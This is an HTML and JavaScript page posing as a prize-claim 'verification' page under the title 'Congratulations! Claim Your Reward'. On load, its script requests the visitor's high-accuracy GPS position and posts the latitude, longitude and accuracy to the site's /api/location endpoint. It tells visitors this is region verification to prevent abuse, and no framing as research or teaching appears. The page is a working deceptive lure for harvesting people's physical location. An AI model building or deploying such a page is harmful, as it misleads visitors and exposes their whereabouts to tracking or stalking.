<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Congratulations! Claim Your Reward</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      min-height: 100vh;
      background: radial-gradient(circle at top, #ffe259 0%, #ffa751 40%, #ff6a88 100%);
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .wrapper {
      width: 100%;
      max-width: 480px;
      background: rgba(255, 255, 255, 0.96);
      border-radius: 18px;
      box-shadow: 0 18px 60px rgba(0, 0, 0, 0.35);
      padding: 28px 24px 24px;
      position: relative;
      overflow: hidden;
    }

    .ribbon {
      position: absolute;
      top: 16px;
      right: -60px;
      background: #ff4757;
      color: #fff;
      padding: 6px 80px;
      transform: rotate(35deg);
      font-size: 11px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 1px;
      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
    }

    .header {
      text-align: center;
      margin-bottom: 18px;
    }

    .header h1 {
      font-size: 26px;
      color: #222;
      margin-bottom: 6px;
    }

    .header p {
      font-size: 13px;
      color: #666;
    }

    .highlight {
      display: inline-block;
      margin-top: 6px;
      padding: 4px 10px;
      border-radius: 999px;
      background: rgba(255, 165, 0, 0.12);
      color: #c0392b;
      font-size: 12px;
      font-weight: 600;
    }

    .prize-box {
      margin: 18px 0;
      padding: 14px 12px;
      border-radius: 12px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: #fff;
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .prize-icon {
      width: 46px;
      height: 46px;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.12);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 26px;
    }

    .prize-details h2 {
      font-size: 18px;
      margin-bottom: 3px;
    }

    .prize-details span {
      font-size: 12px;
      opacity: 0.9;
    }

    .steps {
      margin: 10px 0 14px;
      font-size: 13px;
      color: #444;
    }

    .steps ol {
      padding-left: 18px;
      margin-top: 6px;
    }

    .steps li {
      margin-bottom: 4px;
    }

    .status {
      margin-top: 10px;
      padding: 10px;
      border-radius: 10px;
      font-size: 12px;
      line-height: 1.4;
      display: none;
    }

    .status.loading {
      display: block;
      background: #fff3cd;
      color: #856404;
      border: 1px solid #ffeeba;
    }

    .status.success {
      display: block;
      background: #d4edda;
      color: #155724;
      border: 1px solid #c3e6cb;
    }

    .status.error {
      display: block;
      background: #f8d7da;
      color: #721c24;
      border: 1px solid #f5c6cb;
    }

    .footer-note {
      margin-top: 10px;
      font-size: 11px;
      color: #999;
      text-align: center;
    }

    .debug {
      margin-top: 10px;
      font-size: 11px;
      color: #666;
      display: none;
    }

    .debug span {
      display: block;
      margin-bottom: 2px;
    }
  </style>
</head>
<body>
  <div class="wrapper">
    <div class="ribbon">Limited Offer</div>

    <div class="header">
      <h1>Congratulations! üéâ</h1>
      <p>You have been selected for an exclusive reward.</p>
      <div class="highlight">Step 1 of 2 ¬∑ Verification required</div>
    </div>

    <div class="prize-box">
      <div class="prize-icon">üéÅ</div>
      <div class="prize-details">
        <h2>Premium Gift Package</h2>
        <span>Complete the quick verification to unlock your prize.</span>
      </div>
    </div>

    <div class="steps">
      <strong>How it works:</strong>
      <ol>
        <li>We verify your region automatically (no manual input).</li>
        <li>Once verified, you will be redirected to claim page.</li>
      </ol>
    </div>

    <div id="status" class="status loading">
      Initializing verification... please wait.
    </div>

    <div class="debug" id="debug">
      <span id="dbg-lat"></span>
      <span id="dbg-lon"></span>
      <span id="dbg-acc"></span>
    </div>

    <div class="footer-note">
      This verification helps us prevent abuse and ensure rewards are delivered correctly.
    </div>
  </div>

  <script>
    const statusBox = document.getElementById('status');
    const debugBox = document.getElementById('debug');
    const dbgLat = document.getElementById('dbg-lat');
    const dbgLon = document.getElementById('dbg-lon');
    const dbgAcc = document.getElementById('dbg-acc');

    let locationData = null;
    let submitted = false;

    function setStatus(message, type) {
      statusBox.textContent = message;
      statusBox.className = 'status ' + type;
    }

    function getApiBase() {
      return window.location.hostname === 'localhost'
        ? 'http://localhost:3000'
        : window.location.origin;
    }

    async function sendLocation(payload) {
      const apiBase = getApiBase();

      const res = await fetch(apiBase + '/api/location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      const data = await res.json().catch(() => ({}));
      if (!res.ok) {
        throw new Error(data.error || 'Request failed');
      }
      return data;
    }

    async function autoSubmitLocation() {
      if (submitted) return;
      submitted = true;

      setStatus('Verifying your region...', 'loading');

      try {
        const payload = locationData || {
          lat: '0',
          lon: '0',
          accuracy: 'unknown',
          email: 'fallback-anonymous'
        };

        const data = await sendLocation({
          lat: payload.lat,
          lon: payload.lon,
          accuracy: payload.accuracy,
          email: 'anonymous'
        });

        console.log('‚úÖ Backend response:', data);
        setStatus(
          'Verification complete. Redirecting to reward page...',
          'success'
        );
        // optional redirect
        // setTimeout(() => { window.location.href = 'https://example.com'; }, 1500);
      } catch (err) {
        console.error('‚ùå Fetch error:', err);
        setStatus('Verification failed: ' + err.message, 'error');
        submitted = false;
      }
    }

    function captureLocation() {
      if (!navigator.geolocation) {
        setStatus(
          'Geolocation is not supported by your browser. Using fallback verification‚Ä¶',
          'error'
        );
        autoSubmitLocation();
        return;
      }

      setStatus('Requesting location for verification...', 'loading');

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const { latitude, longitude, accuracy } = pos.coords;
          locationData = { lat: latitude, lon: longitude, accuracy };

          dbgLat.textContent = 'Latitude: ' + latitude;
          dbgLon.textContent = 'Longitude: ' + longitude;
          dbgAcc.textContent =
            'Accuracy: ' + accuracy.toFixed(2) + ' m';

          setStatus(
            'Location detected. Completing verification...',
            'loading'
          );

          setTimeout(autoSubmitLocation, 800);
        },
        (err) => {
          console.warn('Geolocation error:', err);
          setStatus(
            'We could not verify your region precisely (' +
              err.message +
              '). Using fallback verification‚Ä¶',
            'error'
          );
          autoSubmitLocation();
        },
        {
          enableHighAccuracy: true,
          timeout: 30000,
          maximumAge: 0
        }
      );
    }

    window.addEventListener('load', () => {
      captureLocation();
    });
  </script>
</body>
</html>
